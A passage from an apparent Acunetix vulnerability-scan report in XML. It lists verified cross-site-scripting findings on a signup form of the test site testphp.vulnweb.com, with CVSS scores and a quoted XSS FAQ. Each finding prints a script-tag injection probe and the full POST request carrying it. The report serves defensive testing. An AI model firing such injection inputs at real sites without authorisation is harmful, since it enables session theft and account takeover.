       <Details><![CDATA[URL encoded POST input <b><font color="dark">uaddress</font></b> was set to <b><font color="dark">3137%20Laguna%20Street'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9122)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uaddress]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 240
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%2520Laguna%2520Street'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9122)&lt;/ScRiPt&gt;&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=fmkbfbuw&amp;uuname=fmkbfbuw]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 848
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="55" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">ucc</font></b> was set to <b><font color="dark">4111111111111111'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9374)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[ucc]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 236
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9374)&lt;/ScRiPt&gt;&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=wjmdjknr&amp;uuname=wjmdjknr]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:11 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 844
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="56" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uemail</font></b> was set to <b><font color="dark">sample%40email.tst'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9633)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uemail]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

